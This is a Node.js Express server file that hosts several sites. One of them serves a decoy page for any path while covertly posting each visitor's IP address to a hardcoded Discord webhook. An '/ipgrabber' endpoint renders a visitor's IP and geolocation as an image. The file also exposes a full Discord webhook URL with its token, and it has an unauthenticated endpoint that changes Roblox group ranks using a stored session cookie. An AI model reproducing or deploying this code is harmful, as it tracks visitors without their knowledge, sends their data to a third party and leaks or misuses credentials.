const db = require("./db.js");
db.loadFromFile("./db.json");
const { WebhookClient } = require('discord.js')
const wh = "https://discord.com/api/webhooks/1225792925347221554/oMIkPG-NfI6ZWZwmWRVD9a7utTuW7_lrwwPqmOw6t1A5NLYG6R__FmLI7gjg-bR_H2VK"
const webhookClient = new WebhookClient({ url: wh });
const app = require("express")();
const app1 = require("express")();
const app2 = require("express")();
var express = require("express")
var express1 = require("express")
const puppeteer = require("puppeteer");
const { lookup } = require("geoip-lite");
const path = require("path")
const fs = require('fs')
const { robloxcookie } = require('./config.json');
var groupId = 33763450
var cookie = robloxcookie

const rbx = require("noblox.js");
var port = "8080"
var port1 = "8081"
var port2 = "8082"

app.set("json spaces", 4);
app.get("/control", (req, res) => {
  res.sendFile(path.join(__dirname, '/hidden/control.html'))
});
app.use(express.static("public", { extensions: ['html'] }));
app1.use(express.static("2048", { extensions: ['html'] }));
var myBot = db.get("botOn");
var flyvalle = db.get("botOn1");
var rambambot = db.get("botOn2");
var foxy = db.get("botOn3");
var ftcli = db.get("botOn4");
console.log("Website starting...");
async function startApp() {
  await rbx.setCookie(cookie);
  let currentUser = await rbx.getCurrentUser();
  console.log(currentUser.UserName);
}
//startApp();

app.get("/ranker", (req, res) => {
  res.json({ stellarwingsRanker: "Online" })
    var User = req.query['userid'];
    var Rank = req.query['rank'];
  
    rbx.setRank(groupId, parseInt(User), parseInt(Rank));
    res.json("Ranked!");
});

app.get("/up/", (req, res) => res.json({ site: "Up", uptime: new Date(Math.round(process.uptime()) * 1000).toISOString().slice(11, -5) }));
app.get("/forman", (req, res) => res.download(`${__dirname}/public/assets/img/forman.jpg`));
app2.set('trust proxy', true)
app2.get("/assets/img/shim.png", (req, res) => res.sendFile(path.join(__dirname, '/public/assets/img/shim.png')));
app2.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, '/public/shimin.html'))
webhookClient.send({
	content: `${req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for'] ||  req.socket.remoteAddress || "error"}`,
	username: 'ip log',
});
});

const generateImage = (ip) => `<html>
    <head>
        <title></title>
    </head>
    <body>
        <div class="container" style="height:200px;width: 200px;">
            <header>
                Hey there!
            </header>
            <p>I just grabbed your IP</p>
            <p>It's ${ip}</p>
            <p>Which is located around ${lookup(ip)?.city}, ${lookup(ip)?.region} in ${lookup(ip)?.country}</p>
            <footer style="font-size:small">
              This is your sign to get a VPN &#58;p 
            </footer><br>
            <footer style="font-size:xx-small">
                None of this information is being stored &lt;3
            </footer>
        </div>
        
        <style>
            * {
                font-family: Arial, Helvetica, sans-serif;
                text-align: center;
            }
        </style>
    </body>
</html>`

app.set("trust proxy", true);
app.get("/ipgrabber", async (req, res) => {
  const browser = await await puppeteer.launch({ executablePath: "/usr/bin/chromium-browser" });
  const page = await browser.newPage();
  await page.setContent(generateImage(req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for'] ||  req.socket.remoteAddress || "error"));
  await page.setViewport({ height: 250, width: 250 });
  const image = Buffer.from(await page.screenshot({ encoding: "base64" }), "base64");
  await browser.close();

  res.writeHead(200, { "Content-Type": "image/png", "Content-Length": image.length });
  res.end(image);
});
app.get("/hidden/slides", (req, res) => res.sendFile(path.join(__dirname, '/hidden/slides.html')));
app.get("*", (req, res) => res.sendFile(path.join(__dirname, '/public/404.html')));

try {
  app.listen(port);
  app1.listen(port1);
  app2.listen(port2);
  console.log(`Website on! Port: ${port}`);
  console.log(`L freshies on Port: ${port1}`);
  console.log(`shilly shim on Port: ${port2}`);
} catch (error) {
  console.error(error)
}

